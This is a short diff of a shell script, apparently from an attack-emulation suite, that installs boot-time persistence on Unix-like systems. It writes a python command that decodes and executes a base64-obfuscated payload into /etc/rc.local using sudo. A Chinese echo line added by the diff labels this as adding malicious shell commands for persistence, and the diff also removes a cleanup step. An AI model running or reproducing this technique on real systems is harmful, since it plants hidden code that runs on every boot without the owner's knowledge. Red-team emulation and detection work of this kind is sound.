@@ -6,8 +6,6 @@ echo "python3 -c \"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBv
 printf '%s\n' 'exit 0' | sudo tee -a /etc/rc.local
 sudo chmod +x /etc/rc.local
 #check
-echo "/etc/rc.local:"
+echo "修改在类Unix系统启动期间执行的RC脚本/etc/rc.local，在其中添加恶意shell命令来建立持久性："
 cat /etc/rc.local
-if [ -z "$(cat /etc/rc.local)" ]; then echo "No such file or directory"; else echo "<Modify rc.local success>"; fi;
-#cleanup
-ls
+if [ -z "$(cat /etc/rc.local)" ]; then echo "No such file or directory"; fi
